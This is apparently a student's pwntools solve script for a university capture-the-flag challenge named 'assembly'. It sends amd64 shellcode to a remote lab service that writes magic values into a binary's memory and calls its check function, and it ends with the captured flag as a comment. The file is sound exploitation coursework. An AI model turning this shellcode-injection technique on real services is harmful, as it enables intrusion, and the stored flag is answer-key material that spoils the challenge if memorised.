from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./assembly"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1294
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
secrets_addr = e.symbols.secrets
data_404098_addr = 0x404098
check_addr = e.symbols.check

shellcode = asm('''
    mov rax, 0x1badb002
    mov qword ptr [{}], rax    # secrets = 0x1badb002
    mov rax, 0xdead10cc
    mov qword ptr [{}], rax    # data_404098 = 0xdead10cc
    mov rax, {}
    call rax                   # check()
'''.format(secrets_addr, data_404098_addr, check_addr), arch='amd64')

print(p.recvuntil(b"!\n").decode())
p.send(shellcode)
log.info(f"Sending shellcode in raw bytes: {shellcode}")

p.interactive()

# flag{l0w_l3v3l_pr0gr4mm1ng_l1k3_4_pr0!_b9d17ce486575999}
